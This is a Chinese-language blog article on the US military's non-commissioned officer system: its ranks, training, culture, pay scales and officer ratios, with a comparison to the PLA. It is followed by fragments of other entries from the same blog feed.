<p>美军战斗人员中，分为军官、准尉（技术专家）、军士和士兵四类。士官(Non－Commissioned　Officer，直译为“未被任命的军官”，简称NCO。海军和海岸警卫队称为 Petty Officer，简称 PO)，也泛称军士(Sergeant)，士官制度最早出现于15世纪的法国，当时是作为军官制度的补充而设立的，此后为各国广泛采用。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Info-1.png" alt="美军人员编制序列"></p>
<h3 id="独立的管理系统：士官指挥的军队"><a href="#独立的管理系统：士官指挥的军队" class="headerlink" title="独立的管理系统：士官指挥的军队"></a>独立的管理系统：士官指挥的军队</h3><blockquote>
<p>美国海军陆战队士官手册：<br>“一个军官刚出学校门，又没有士官在他跟前告诉他一些工作窍门以避免问题的发生，那会怎样？”<br>“没有士官做中间人，对纪律至关重要的命令的威严不复存在。”</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Info-3.png" alt="美军士官序列"></p>
<p>士官都是各自专业的骨干能手，不仅能胜任初级指挥员和助理教官，负责日常训练和管理，而且还负责本专业设备的技术操作与维修，确保武器装备在作战训练中始终保持良好状态。美军中许多士官任小单位或技术性工作的领导，或负责训练士兵掌握单兵技能，是美军的直接监督者。除了胜任基层职务，在营级设有一级军士长（美军基本指挥单位，相当于多数国家团级建制），师旅一级的军士长，不仅负责制定计划，向军事主官提供作战建议，还负责反映士兵意见，维护士官、士兵权益等类似“工会主席”的职责。不仅在作战单位，士官还可以在国防大学担任教官，在领导机关－国防部和军兵种司令部，到处到可以看到士官的身影。例如陆军参谋长（司令）的直接下属中就包括一名总军士长：</p>
<p>陆军参谋长（Chief of Staff of the Army）</p>
<ul>
<li>陆军第一副参谋长（Vice Chief of Staff of the Army）</li>
<li>美国陆军军医总监（Surgeon General of the Army）</li>
<li>国民警卫队局局长（Chief, National Guard Bureau）</li>
<li>陆军后备队局局长（Chief, Army Reserve）</li>
<li>总法律顾问（Judge Advocate General）</li>
<li><strong>陆军总军士长（Sergeant Major of the Army）</strong></li>
<li>后勤副参谋长（Deputy Chief of Staff (Logistics)） (G-4)</li>
<li>工兵主任（Chief of Engineers）</li>
<li>项目副参谋长（Deputy Chief of Staff (Programs)） (G-8)</li>
<li>设施管理助理参谋长（Assistant Chief of Staff, Installation Management）</li>
<li>美国陆军设施管理司令部（United States Army Installation Management Command）</li>
<li>人事副参谋长（Deputy Chief of Staff (Manpower)） (G-1)</li>
<li>情报副参谋长（Deputy Chief of Staff (Intelligence)） (G-2)</li>
<li>计划、作战与转型副参谋长（Deputy Chief of Staff (Plans, Operations and Transformation)） (G-3/5/7)</li>
</ul>
<h3 id="独立的训练系统：士官学校"><a href="#独立的训练系统：士官学校" class="headerlink" title="独立的训练系统：士官学校"></a>独立的训练系统：士官学校</h3><p>美军的士官培训由一名国防部助理部长主管，四大军种不仅各有一名副参谋长负责，形成“基地训练中心－士官学校－军种士官学校”三级培训系统。美军共有七十多所院校可培训士官，开设上千类课程，包括了所有专业领域，甚至涵盖了管理、商业等社会通用专业，这些院校实行统一的考核标准。在电影《深海潜将》中，男主人公之所以要在训练学校玩命，就是因为只有在士官学校中毕业才可以晋升技术等级、晋升军衔，最终获得海军最高士官军衔。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Education-1.jpg" alt="海军潜水学校"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Navy-Film-A-12.jpg" alt="入学的时候，伙夫还只是一名海军中士"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Navy-Film-A-2.jpg" alt="士官学校的教官也是士官"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Navy-Film-A-14.jpg" alt="潜水学校毕业后，晋升到E6这个衔级可以达到中产阶级生活水准"><br>潜水学校毕业后，晋升到E6。中级士官序列中的最高等级，一般可以获得中产阶级生活水准。当然艺术作品免不了浓缩和美化，真实历史原型更加曲折。详见 <a href="https://web.archive.org/web/20041204230006/http://history.navy.mil/faqs/faq105-1.htm" target="_blank" rel="noopener">Master Chief Boatswain’s Mate Carl Maxie Brashear,USN</a>。</p>
<p>July-September 1960 Deep-Sea Diving School, Washington, D.C.—Student, failed the course</p>
<p>September 1960-March 1961 USSNereus(AS-17)—Deck Division Chief Boatswain’s Mate</p>
<p>March 1961-April 1962Fleet Training Center, Pearl Harbor, Hawaii—Chief Master-at-Arms; Requalified as Second Class Diver; Temporary Additional Duty with Joint Task Force Eight</p>
<p>April 1962-October 1963 USSCoucal(ASR-8)—Ship’s Chief Boatswain’s Mate; Second Class Diver; Underway Officer of the Deck; In-Port Duty Chief</p>
<p>October 1963-June 1964 Deep-Sea Diving School, Washington, D.C.—Student, graduated as First Class Diver</p>
<ul>
<li>E1— NDSR— Navy DiverSeaman Recruit</li>
<li>E2— NDSA— Navy DiverSeaman Apprentice</li>
<li>E3— NDSN— Navy DiverSeaman</li>
<li>E4— ND3— Navy Diver ThirdClass</li>
<li>E5— ND2— Navy DiverSecond Class</li>
<li>E6— ND1— Navy Diver FirstClass</li>
<li>E7— NDC— Chief Navy Diver</li>
<li>E8— NDCS— Senior ChiefNavy Diver</li>
<li>E9— NDCM— Master ChiefNavy Diver</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Navy-Film-A-21.jpg" alt="听证会上伙夫的军衔是：E8 Senior Chief 也就是说距离海军最高士官军衔只差一步"></p>
<h3 id="独立的文化系统"><a href="#独立的文化系统" class="headerlink" title="独立的文化系统"></a>独立的文化系统</h3><blockquote>
<p>是否形成自己独特的传统和身份认同，是一个阶层成熟度的主要指标。</p>
</blockquote>
<p><strong>士官长的办公室</strong></p>
<p>美军101师为例，在官方礼仪序列上，该师总军士长甚至比师参谋长（准将）靠前。他的办公室，就在师长（少将）的办公室旁边，墙上是101师历任总军士长的照片，桌子上堆满文件。</p>
<p><strong>太太随军</strong><br>已婚的士官和军官一样都有单独的住房，有自己的俱乐部，也有太太俱乐部。有些人住在营区外，在101师我们看到很多士官是开着车来到军营，就象上下班一样。当士兵是他们永久的职业，而这一职业有着完整的晋升阶梯。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Navy-Film-A-3.jpg" alt="潜水学校的士官俱乐部"></p>
<p><strong>老士官：连队灵魂</strong></p>
<blockquote>
<p>美军的新兵训练，全权由士官负责。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergenat-PHT-Film.png" alt="负责新兵训练的教育士官长（标志性的帽子）"></p>
<p>像美国海军陆战队这种一线作战单位中，狙击手能够服役到接近60岁。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Honour-3.png" alt="老资格狙击手"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Navy-Film-A-6.jpg" alt="左：医院里负责军纪的士官长（注意它的徽章）右：手眼通天的老比利"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Navy-Film-A-10.jpg" alt="前：老比利不仅是资深技术教练，也是牛逼闪闪的人生导师 后：人事处上校官僚、一大票退休海军高级将领"></p>
<p><strong>勋章荣衔</strong></p>
<blockquote>
<p>礼者，敬人也。</p>
</blockquote>
<p>高级士官的礼服零碎不比四星上将少。<br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Honour-2.png" alt="美军总军士长和四星上将"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Honour-11.png" alt></p>
<p>目前识别体系中有两个明显漏洞，更多内容请参考 <a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">&gt;&gt;&gt; 美军授勋和嘉奖制度观察</a><br>1.勋略:实质只能反映级别，而不能体现是否获得勋章<br>2.士官和列兵一样，只有国防服役章，没有勋略<br>3.总体简单粗暴，无法体现个性</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Navy-Film-A-19.jpg" alt="看起来很屌的样子"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Navy-Film-A-22.jpg" alt="经典片段：海军听证会门口"></p>
<p>警卫：海军陆战队 中士 军衔E5<br>抽烟斗的比利：军衔 E7 （影片中就至少三次犯错误，三次被降级，依然属于高级士官序列）。胸口上勋略，勋章一堆就不列举了，最顶上的是海军十字勋章（非常牛逼，混到将军都未必有）。<br>袖子上的斜杆也很考究。一道代表服役3年，老比利有7道杆，即服役21年。伙夫是4道，即12年。颜色也有区分，黄色表示持续N年没有犯过任何错误，是一个好学生，红色则表示犯过错误、受过处分。这是一位功勋卓著、超长服役的老兵、还TM不怕犯错误的牛人，哪个警卫敢拦啊！</p>
<h2 id="制度基石"><a href="#制度基石" class="headerlink" title="制度基石"></a>制度基石</h2><p>美军太平洋总部总军士长、空军一级军士长詹姆斯·A·罗伊，曾经率领美军士官代表团访华，在结束访问回国后评价说：“如果让我评价解放军的士官队伍，<strong>我要说他们的士官全是技师</strong>。”美军士官代表团参观了位于武汉的一所士官学校，里面的训练大多是技术性的。<strong>“他们很单一，解放军的士官只是作为技师培养的，而美军各级单位中都有士官担任领导者。”</strong></p>
<p>这一尖锐评论，通过大量影视作品中也可以得到印证：优秀士兵一定都在梦寐以求考军校、有朝一日当干部，要么编造一个神话、斩杀大BOSS之后可以提干当官，要么再不济也要进入所谓“特种部队”、有朝一日可以比军官还牛逼。</p>
<blockquote>
<p>编剧的胡编乱造也有其深刻的现实原因：<br>天朝士官并不像美军，是一个从上到下的独立阶层，有自己的管理、晋升系统，以及文化传统。</p>
</blockquote>
<p>中美两军总人数大致相当，美军150万，解放军200万，在士官制度方面出现如此显著的差异，至少有以下四个方面的原因：</p>
<h3 id="宪法基础：以文制武"><a href="#宪法基础：以文制武" class="headerlink" title="宪法基础：以文制武"></a>宪法基础：以文制武</h3><p>政治传统、英国的历史、自身痛苦的经历必将影响制宪者对于和平时期常备军威胁的认知。制宪者认为和平时期建立军事组织很有必要，但是如何防止他们在军事权的行使时不致于推翻宪法、颠覆共和政体?</p>
<p>具体来说，就是彻底的文官节制武将的制度设计（civilian control of the military），消除军事力量的威胁。</p>
<blockquote>
<p>1.文职的总统担当陆海军总司令，并通过提名国防部长领军，将军队置于民选政府的控制之下。<br>2.国会掌握宣战权。审议并批准高级将领人事任命。<br>3.国会立法设置军衔、职务、人员编制，批复军费预算。军队不能自我扩张。</p>
</blockquote>
<p><strong>《1947年国家安全法案》</strong> 授权成立了国家军事机构，设立了国防部长一职，作为国家军事机构的首长。美军的《士官条例》和《军人条例》中明确规定了士官的职责、地位和任务。美军高级士官的权力和待遇与低级军官大致相同，但是士官的服役期限较长。</p>
<h3 id="思想基础：官兵分离"><a href="#思想基础：官兵分离" class="headerlink" title="思想基础：官兵分离"></a>思想基础：官兵分离</h3><p>从社会学角度看，政务和事务分离的思想在“盎格鲁－撒克逊”文化传统中源远流长。早期近代军队的士兵通常来自农民、手工业者和无业游民，军官则主要来自贵族阶层，军官负责代表统治阶层掌握武装，士官则作为军官的助手，负责管理士兵。二者社会地位、待遇、生活习惯有如云泥之别，这种分工还很容易世袭罔替，阶层鸿沟愈加根生蒂固。</p>
<p>从军事学角度看，军官企图来做军士长的工作是也是一件很危险的事。<br>军官的职责首先是指挥、谋划，着眼于未来，如果将大量时间用于事务性管理，例如士兵基础培训、卫生、纪律、个人纠纷等等，则无法集中精力本职工作。事务性工作和创造性工作，二者体制不同、训练方法不同、对人的知识结构、素质要求更加不同。</p>
<p>1778年，华盛顿任命自己的亲密战友弗里德里希·冯·斯图本将军对军队进行重组，斯图本效仿普鲁士军队，取消由军官训练士兵的做法，而是设立第一军士长来训练士兵。到现在，当美军连指挥官在做出涉及士兵问题的决策前，都会听取第一军士长的意见。</p>
<h3 id="技术基础：技术密集型-amp-高度流动性"><a href="#技术基础：技术密集型-amp-高度流动性" class="headerlink" title="技术基础：技术密集型 &amp; 高度流动性"></a>技术基础：技术密集型 &amp; 高度流动性</h3><p>美军应该是全世界技术密集度最高企业级组织。陆、海、空、天、网络空间，遍布全球的军事基地和监测网络，高频率地进行战争行动，作战、训练、休整、装备维护保养、补充新技术，日夜轮转、马不停蹄。作为全球少数全志愿兵役制国家，美军又是流动性最强的军队之一。多数士兵参军的理由无非是：学技术、赚奖学金、赚保险金、赚公民身份等等，对他们来说，当兵只是打份工。合同到期日那天，不管大兵们身处世界上哪个角落，都可以毫不犹豫地放下手上的工作，坐上回家的航班，去上学、去干自己喜欢的事。这种情况下，如果没有相对稳定的士官队伍，根本无法维持运转。目前美军通常一个营级单位，就会有20多个高级士官（35岁左右）。</p>
<h3 id="财务基础"><a href="#财务基础" class="headerlink" title="财务基础"></a>财务基础</h3><p>美军士官基本薪酬，下士2.4万美元、中士2.6万美元、上士2.8万美元、三级军士长3.3万美元、二级军士长3.8万美元、一级军士长4.5万美元。</p>
<p>2019 财年美军涨薪之后的最新数据为：二等兵的基本工资每月为 1553 美元（现役军人最低工资），士官每月 2195-8242 美元，准尉3117-10223美元，下级军官每月3189-6917美元，中级军官4836-11902美元（军校学员每月1116美元，少尉每月3189美元，少校4836美元，上校6722美元）。</p>
<p>中高级士官的工资水平可以达到少尉到少校区间。这有利于激励士官继续服役，使其熟练掌握专业技能，维持职业化军队的专业性。</p>
<p>除了基本年薪以外，士官还享受各种补助和津贴，如伙食补助、医务津贴、房租补助、执行危险任务补助、接触核武器补助、海外服役补助、作战补助等10余项，各种补助及津贴的数目相当大。此外，士官可以婚恋、家属可以随军、享受军队医疗保险，退役之后海可以获得奖学金。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Navy-Film-A-13.jpg" alt="老比利的一身行头，价值不菲"></p>
<blockquote>
<p>丰厚的士官待遇，除了美军预算体量巨大之外，不可忽视一个重要特征：<br>美军有着世界上最小的将官比例，这是拥有最大士官比例的重要前提。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Info-2.png" alt="美军官兵比例"></p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/61549937" target="_blank" rel="noopener">【Infographic】提康德罗加巡洋舰上有多少人？</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/60980125" target="_blank" rel="noopener">【Infographic】阿利伯克驱逐舰上有多少人？</a></li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>美国陆军</th>
<th>军官</th>
<th>准尉</th>
<th>士兵</th>
<th>合计</th>
<th>官兵比</th>
</tr>
</thead>
<tbody>
<tr>
<td>装甲旅 <strong>2020年</strong></td>
<td>360 7.69%</td>
<td>43 0.92%</td>
<td>4276 91.39%</td>
<td>4679 -0.6%（减少28人）</td>
<td>8.42%</td>
</tr>
<tr>
<td>装甲旅 <strong>2014年</strong></td>
<td>351 7.55%</td>
<td>43  0.92%</td>
<td>4257  91.52%</td>
<td>4651  -2%（减少92人）</td>
<td>8.24%</td>
</tr>
<tr>
<td>装甲旅 <strong>2013年</strong></td>
<td>365  7.70%</td>
<td>41  0.86%</td>
<td>4337 91.44%</td>
<td>4743</td>
<td>8.42%</td>
</tr>
<tr>
<td>步兵旅 <strong>2020年</strong></td>
<td>273 6.39%</td>
<td>43 1.00%</td>
<td>3956 92.60%</td>
<td>4272 -0.86%（减少37人）</td>
<td>6.90%</td>
</tr>
<tr>
<td>步兵旅 <strong>2014年</strong></td>
<td>347 8.05%</td>
<td>44  1.02%</td>
<td>3918  90.93%</td>
<td>4309 -3.4%（减少153人）</td>
<td>8.86%</td>
</tr>
<tr>
<td>步兵旅 <strong>2013年</strong></td>
<td>358  8.02%</td>
<td>42  0.94%</td>
<td>4062 91.04%</td>
<td>4462</td>
<td>8.81%</td>
</tr>
<tr>
<td>骑兵旅 <strong>2020年</strong></td>
<td>342 7.96%</td>
<td>40 0.93%</td>
<td>3916 91.11%</td>
<td>4298 -4.3%（减193人）</td>
<td>8.73%</td>
</tr>
<tr>
<td>骑兵旅 <strong>2014年</strong></td>
<td>343 7.64%</td>
<td>43  0.96%</td>
<td>4105  91.41%</td>
<td>4491 -0.2%（减少10人）</td>
<td>8.36%</td>
</tr>
<tr>
<td>骑兵旅 <strong>2013年</strong></td>
<td>348  7.77%</td>
<td>42  0.94%</td>
<td>4091 91.30%</td>
<td>4481</td>
<td>8.51%</td>
</tr>
</tbody>
</table>
</div>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><blockquote>
<p>结构决定性质。</p>
</blockquote>
<p>综上所述，全面士官制度在人才培养、文化传承、作战效能、军费投入产出比等方面有巨大优势，但是该制度本身并不是空中楼阁，而是一系列社会制度设计的组成部分。在社会心理、法律框架等方面有诸多前提条件，特别是战争压力（外部）、立法审查压力（内部）两个决定性驱动因素。某些国家也在大规模推进士官制度改革，其是否能成功的关键，在于是否能解决官兵比例过高的问题。最重要的观察指标就是：是否能裁撤一半以上将官，即减少2000名少将以上军衔编制。</p>
<p>最后重申，美军士官制度成功的重要经验之一是：为士兵设计上升通道，给予更多责任和待遇；坚决把军官必须从事务性工作中解放出来，投入到更有价值的创造性活动中去。东方传统中，“学而优则仕，技而忧则仕”的观念深入人心。潜意识里面，很多时候还是比较喜欢把技术专业型人才摆在经营管理岗位，或者把经营管理人才捆绑在事务性劳动中，如果有一些实际工作经验思考的话，应该知道，这些行为都会造成无可估量的损失和浪费。</p>
<p>军官、士官、士兵的知识结构、能力素质、目标责任不同，也就必须有不同遴选、训练、考核模式。任何制度都不是完美的，美军也出现过很多失败的实践，例如“摇一摇军士”。 越战时期，小威廉-卡利带领的第11步兵旅因美莱大屠杀获得了特别嘉奖，这说明受“专家”崇拜的影响，军队也盛行“文凭主义”，即获奖情况决定晋升情况。“嘉奖泛滥成灾，结果写嘉奖令成为了一门艺术。”士兵被莫名其妙地授衔：“我们叫他们‘摇一摇军士’。找个二等兵，稍微训练一下，再要一两下，就宣布他成为了军士。” （注解：“Shake-and-bake sergeant”。Shake-and-bake 是卡夫食品公司推出的一款产品，该产品把生肉片和调过味的面包屑放在一起装在小袋里，这样摇一摇让面包屑附着在生肉片上就可以直接烘烤了。这一问题留待以后详细讨论。</p>
<h2 id="附表"><a href="#附表" class="headerlink" title="附表"></a>附表</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Class-E1-E4.png" alt="列兵：E1-E3 初级士官：E4"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Class-E5-E7.png" alt="骨干：中级士官 E5-E7"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Navy-Film-B-2.jpg" alt="《潜艇总动员》剧照"></p>
<p>中级士官可以说是美军的中坚力量，在技术密集度很高的海军更是如此。如电影剧照：前：E5 声纳技师  后：E6 机械技师<br>中：O3 年轻的海军上尉（军官Officer属于完全不同的晋升培养体系）</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Class-E8-E9.png" alt="专家/领导者：E8-E9"><br>这个阶层人数很少，服役时间很长。总军士长，每个军种一个。从称呼上看，E9通常也分为两个序列，一是Master，即某一专业领域绝对的专家，应该主要负责教育、训练。另外就是Command，指挥、管理的成分更明显，他们是高级军官的直接助手。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-Rank-Army-1.jpeg" alt="美陆军士官军衔"></p>
<ul>
<li>美军基本工资表（2019财年，单位：美元）</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>类别</th>
<th>军衔</th>
<th>薪资</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>士兵</td>
<td>二等兵</td>
<td>1553/month</td>
<td>Max=2234/month</td>
</tr>
<tr>
<td>士官</td>
<td></td>
<td>2195~8242/month</td>
<td></td>
</tr>
<tr>
<td>士官</td>
<td>下士</td>
<td>$2.4w/year</td>
<td></td>
</tr>
<tr>
<td>士官</td>
<td>中士</td>
<td>$2.6w/year</td>
<td></td>
</tr>
<tr>
<td>士官</td>
<td>上士</td>
<td>$2.8w/year</td>
<td></td>
</tr>
<tr>
<td>士官</td>
<td>三级军士长</td>
<td>$3.3w/year</td>
<td></td>
</tr>
<tr>
<td>士官</td>
<td>二级军士长</td>
<td>$3.8w/year</td>
<td></td>
</tr>
<tr>
<td>士官</td>
<td>一级军士长</td>
<td>$4.5w/year</td>
<td></td>
</tr>
<tr>
<td>准尉</td>
<td></td>
<td>$3117-$10223/month</td>
<td></td>
</tr>
<tr>
<td>军官</td>
<td>军校学员</td>
<td>$1116/month</td>
<td></td>
</tr>
<tr>
<td>军官</td>
<td>少尉</td>
<td>$3189/month</td>
<td></td>
</tr>
<tr>
<td>军官</td>
<td>少校</td>
<td>$4836/month</td>
<td></td>
</tr>
<tr>
<td>军官</td>
<td>中校</td>
<td></td>
<td></td>
</tr>
<tr>
<td>军官</td>
<td>上校</td>
<td>$6722/month</td>
<td>服役6年：7900 <br> 服役26年：11669</td>
</tr>
<tr>
<td>军官</td>
<td>准将</td>
<td>$8300/month</td>
<td>将官：$8866 ~ $16211</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<p>具体到2019财年美国现役军人的基本工资数额。从最低等级开始，一名二等兵的基本工资每月为1553美元，这是美军现役军人的最低工资，士兵每月最高工资2234美元。士官每月2195-8242美元。准尉3117-10223美元。下级军官每月3189-6917美元，中级军官4836-11902美元，将官8866-16211美元。</p>
<p>这样一来，少尉每月3189美元，少校4836，上校6722，准将每月8300美元。军校学员每月的基本津贴为服役不足两年的少尉基本工资的35%，即1116美元。预算获得通过，2019年1月1日起生效，1月15日计入军人个人账户。</p>
<p>军龄工资也显著增长。例如，一名服役6年的上校2019年每月7900美元，服役26年的上校超过11669美元（增长48%）。对于每个等级，确定服役最高年限，超过这个年限，工资不再增长，例如，少尉3年，上尉14年，少校18年，上校和将军30年。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="军事史"><a href="#军事史" class="headerlink" title="军事史"></a>军事史</h4><ul>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-CN/" target="_blank" rel="noopener">中国军事史 | Military History of China</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">美国军事史 | Military History of United States</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">太平天国史</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">私人历史文献 | 弗吉尼亚笔记</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">私人历史文献 | 时晴斋主人自叙年谱</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
</ul>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a>讲武堂</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/" target="_blank" rel="noopener">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/" target="_blank" rel="noopener">外军研究|美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">外军研究|军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/" target="_blank" rel="noopener">外军研究|军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">外军研究|美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/" target="_blank" rel="noopener">太公分猪肉—香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h4 id="体能训练"><a href="#体能训练" class="headerlink" title="体能训练"></a>体能训练</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">Physical Training | 美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand" target="_blank" rel="noopener">Physical Training | 军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.com/2016/04/26/PHT-Running//">Physical Training | 训练项目：跑步</a></li>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">Physical Training | 训练项目：跳绳</a></li>
<li><a href="http://www.jianshu.com/p/6a2fea20b57b" target="_blank" rel="noopener">Physical Training | 跑步路线推荐</a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-RunningApp/">Physical Training | 跑步应用评测</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/bx5cX5KD8rX3ae1K7QeJeQ" target="_blank" rel="noopener">《解放军报》头版头条关注第81集团军士官培养经验做法</a></li>
<li><a href="https://www.defense.gov/About/Insignias/Enlisted/" target="_blank" rel="noopener">美国国防部：ENLISTED RANK INSIGNIAS</a></li>
<li><a href="https://www.usna.edu/Users/oceano/pguth/website/shipwrecks/eng_tech_2/navy_diving.pdf" target="_blank" rel="noopener">U.S. Navy Diving - An Overview</a></li>
<li><a href="https://www.public.navy.mil/bupers-npc/reference/milpersman/1000/1200Classification/Documents/1220-100.pdf" target="_blank" rel="noopener">MILPERSMAN 1220-100 NAVY DIVER (ND) RATING</a></li>
<li><a href="https://web.archive.org/web/20041204230006/http://history.navy.mil/faqs/faq105-1.htm" target="_blank" rel="noopener">Master Chief Boatswain’s Mate Carl Maxie Brashear,USN</a></li>
<li><a href="http://gdjyyjxb.nudt.edu.cn/ch/reader/create_pdf.aspx?file_no=201603012&amp;flag=1&amp;journal_id=gdjyyjxb&amp;year_id=2016" target="_blank" rel="noopener">美军士官职业教育体系综述</a></li>
<li><a href="http://mil.sohu.com/20100201/n269965654.shtml" target="_blank" rel="noopener">美国陆军军事训练中士官角色的演变</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDMxOTQwNw==&amp;mid=2650052519&amp;idx=1&amp;sn=408bc0f8eae49addf323928ba875ee49&amp;chksm=8701a4e7b0762df1f145147abb77a6ab3bfa22d44bc9d05a101eaa0b8a2159bf592457ba2927&amp;mpshare=1&amp;scene=1&amp;srcid=%23rd" target="_blank" rel="noopener">2019年美军最新工资结构分析|知远防务评论</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/61549937" target="_blank" rel="noopener">【Infographic】提康德罗加巡洋舰上有多少人？</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/60980125" target="_blank" rel="noopener">【Infographic】阿利伯克驱逐舰上有多少人？</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/image_824254815542_3.png" alt></p>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
      </tags>
  </entry>
  <entry>
    <title>War Game</title>
    <url>/2020/09/06/Commander-WarGame/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h2 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h2><h4 id="彼得·波拉（Peter-Perla）"><a href="#彼得·波拉（Peter-Perla）" class="headerlink" title="彼得·波拉（Peter Perla）"></a>彼得·波拉（Peter Perla）</h4><p>彼得·波拉（Peter Perla）博士是美国著名作战模拟和兵棋界的权威，美国海军分析中心（CNA）专家，著有 <strong>《兵棋推演艺术》</strong>。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/0JbdTMmFOsqKJXBpZ9uuDA" target="_blank" rel="noopener">玩一千局文明六，领悟了什么</a></li>
<li><a href="https://mp.weixin.qq.com/s/o-NG5592w_HiKRmoAWs2Qw" target="_blank" rel="noopener">文明6风云变幻神级通关万能攻略</a></li>
<li><a href="https://mp.weixin.qq.com/s/O4aj82va6YfYKB4K_gSCrQ" target="_blank" rel="noopener">提前玩过《文明6 迭起兴衰》之后，这是我想说的</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>讲武堂</title>
    <url>/2016/04/26/Commander/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<blockquote>
<p>言战者多，被甲者少 ——韩非子</p>
</blockquote>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a>讲武堂</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/" target="_blank" rel="noopener">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/" target="_blank" rel="noopener">外军研究|美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">外军研究|军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/" target="_blank" rel="noopener">外军研究|军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">外军研究|美军授勋和嘉奖制度观察</a></li>
